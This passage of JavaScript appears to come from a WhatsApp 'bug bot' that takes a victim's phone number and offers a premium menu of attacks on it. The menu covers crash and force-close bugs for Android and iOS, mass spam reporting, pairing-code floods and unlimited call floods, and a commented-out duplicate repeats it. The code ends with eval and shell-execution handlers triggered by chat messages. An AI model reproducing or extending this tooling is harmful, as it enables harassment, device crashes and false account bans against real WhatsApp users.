if (!PremOnly) return ReplyBug("*You are not a Premium User*");
if (!q) return ReplyRyc("Example Usage:\n.xbug 62xxx / @tag");

let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) {
return ReplyBug(
`The number starts with '0'.
Use country code.

Example:
.xbug 62xxxxxxxxxx`
);
}

let isTarget = `${jidx}@s.whatsapp.net`;

Kai.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/8mc9p2.png" },
caption: "Select Bug Category",
footer: "Tredict Invictus",
headerType: 1,
viewOnce: true,
buttons: [
{
buttonId: ".allmenu",
buttonText: { displayText: "All Menu" },
type: 1
},
{
buttonId: ".tqto",
buttonText: { displayText: "Thanks To" },
type: 1
},
{
buttonId: "bug-menu",
buttonText: { displayText: "Bug Menu" },
type: 9,
nativeFlowInfo: {
name: "single_select",
paramsJson: JSON.stringify({
title: "Bug Options",
sections: [
{
title: "Android Bugs",
rows: [
{
header: "Android",
title: "Invisible Delay",
description: "Delay & Invisible Bug",
id: `.xinvis ${isTarget}`
},
{
header: "Android",
title: "Force Close Invisible",
description: "Force Close Method",
id: `.xforce ${isTarget}`
},
{
header: "Android",
title: "Low Device Bug",
description: "Crash Low-End Device",
id: `.nightbut ${isTarget}`
}
]
},

{
title: "iOS Bugs",
rows: [
{
header: "iOS",
title: "iOS Glitch",
description: "Visual Bug for iPhone",
id: `.elysium ${isTarget}`
}
]
},
{
title: "Tools WhatsApp",
rows: [
{
header: "Reporting Targets",
title: "Spam WhatsApp",
description: "Report Spam",
id: `.spam-report ${isTarget}`
},
{
header: "Pairing Spam",
title: "Pairing Flood",
description: "Pair Code Spam",
id: `.spam-pairing ${isTarget}`
},
{
header: "Call Target",
title: "Call Flood",
description: "Unlimited Call",
id: `.spamcall ${isTarget}`
}
]
}

]
})
}
}
]
}, { quoted: null });
}
break;

/*case 'xbug': {
if (!PremOnly) return ReplyBug("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n Combine 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyBug(`The number starts with '0'. Replace it with the country code number.\n\nExample: .xbug 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;
    
  Kai.sendMessage(m.chat, {
  caption: "Select Options Bugs", 
  image: { url: "https://files.catbox.moe/8mc9p2.png" },
  footer: "Tredict Invictus",
  buttons: [
    { 
      buttonId: `.allmenu`, 
      buttonText: {
      displayText: '𝙼𝚎𝚗𝚞 𝙰𝚕𝚕'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.tqto', 
      buttonText: {
      displayText: '𝚝𝚑𝚊𝚗𝚔𝚝𝚘'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: 'Tredict Invictus', 
      buttonText: {
      displayText: 'Bug Menu' 
      }, 
      type: 9, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "Options",
        "sections": [
            {
                "title": "Come On Bug Target",
                "highlight_label": "",
                "rows": [
                    {
                        "header": "For Android",
                        "title": "Invisible Delay",
                        "description": "⩟",
                        "id": ".xinvis ${isTarget}"
                    },
                    {
                    header": "For Android",
                        "title": "Force Close Invisible",
                        "description": "⩟",
                        "id": ".xforce ${isTarget}"
                    },
                    {
                    header": "For Android",
                        "title": "Low Device",
                        "description": "⩟",
                        "id": ".nightbut ${isTarget}"
                    },
                    {
                        "header": "For Ios",
                        "title": "𝙶𝚕𝚒𝚝𝚌𝚑 𝙸𝚘𝚜",
                        "description": "⩟",
                        "id": ".elysium ${isTarget}"
                    }, 
                    {
                    header": "Spam Prank",
                        "title": "Spaming WhatsApp",
                        "description": "⩟",
                        "id": ".spam-report ${isTarget}"
                    },
                    {
                    header": "Spam Prank",
                        "title": "𝙿𝚊𝚒𝚛 𝙲𝚘𝚍𝚎𝚜",
                        "description": "⩟",
                        "id": ".spam-pairing ${isTarget}"
                    },
                    {
                    header": "Spam Prank",
                        "title": "𝙲𝚊𝚕𝚕𝚒𝚗𝚐 𝚄𝚗𝚕𝚒",
                        "description": "⩟",
                        "id": ".spamcall ${isTarget}"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: null });
}
break*/


//CASE HALO
//END

//------- Security
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!CreatorOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return ReplyBug(bang)}
try {
ReplyBug(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
ReplyBug(String(e))}}
if (budy.startsWith('>')) {
if (!CreatorOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ReplyBug(evaled)
} catch (err) {
await ReplyBug(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!CreatorOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return ReplyBug(`${err}`)
if (stdout) return ReplyBug(stdout)
})
}
//========================================================\\
}
} catch (err) {
Kai.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\